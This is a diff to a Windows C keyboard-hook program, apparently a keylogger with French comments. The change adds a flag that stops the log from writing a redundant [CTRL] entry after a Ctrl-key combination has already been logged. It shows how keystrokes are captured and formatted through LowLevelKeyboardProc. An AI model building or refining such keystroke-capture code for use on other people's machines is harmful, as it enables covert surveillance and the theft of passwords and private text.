@@ -1,6 +1,7 @@
 #include "winkey.h"
 
 HWND lastWindow = NULL;
+static int suppress_ctrl_up = 0;
 
 char *get_clean_process_name(const char* full_path) {
     const char* last_backslash = strrchr(full_path, '\\');
@@ -102,6 +103,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 comboBuf[1] = '\0';
                 char out[16];
                 snprintf(out, sizeof(out), " [CTRL+%s] ", comboBuf);
+                suppress_ctrl_up = 1;
                 LogKey(out);
                 return CallNextHookEx(NULL, nCode, wParam, lParam);
             }
@@ -112,19 +114,21 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             if (GetKeyNameTextA(lParamForName, keyName, sizeof(keyName))) {
                 char comboBuf[80];
                 snprintf(comboBuf, sizeof(comboBuf), " [CTRL+%s] ", keyName);
+                suppress_ctrl_up = 1;
                 LogKey(comboBuf);
                 return CallNextHookEx(NULL, nCode, wParam, lParam);
             }
 
             // sinon gérer quelques touches spéciales avec Ctrl
-            if (vkCode == VK_RETURN) { LogKey(" [CTRL+ENTER]\n"); return CallNextHookEx(NULL, nCode, wParam, lParam); }
-            else if (vkCode == VK_TAB) { LogKey(" [CTRL+TAB] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
-            else if (vkCode == VK_SPACE) { LogKey(" [CTRL+SPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
-            else if (vkCode == VK_BACK) { LogKey(" [CTRL+BACKSPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
+            if (vkCode == VK_RETURN) { suppress_ctrl_up = 1; LogKey(" [CTRL+ENTER]\n"); return CallNextHookEx(NULL, nCode, wParam, lParam); }
+            else if (vkCode == VK_TAB) { suppress_ctrl_up = 1; LogKey(" [CTRL+TAB] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
+            else if (vkCode == VK_SPACE) { suppress_ctrl_up = 1; LogKey(" [CTRL+SPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
+            else if (vkCode == VK_BACK) { suppress_ctrl_up = 1; LogKey(" [CTRL+BACKSPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
 
             // si non reconnu, logger code hex en fallback et empêcher double-écriture
             char comboBufHex[32];
             snprintf(comboBufHex, sizeof(comboBufHex), " [CTRL+0x%lX] ", (unsigned long)vkCode);
+            suppress_ctrl_up = 1;
             LogKey(comboBufHex);
             return CallNextHookEx(NULL, nCode, wParam, lParam);
         }
@@ -145,7 +149,11 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
         DWORD vkCode = pKeyboard->vkCode;
         if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
-            LogKey(" [CTRL] ");
+            if (suppress_ctrl_up) {
+                suppress_ctrl_up = 0;
+            } else {
+                LogKey(" [CTRL] ");
+            }
         } else if (vkCode == VK_LMENU || vkCode == VK_RMENU) {
             LogKey(" [ALT] ");
         }
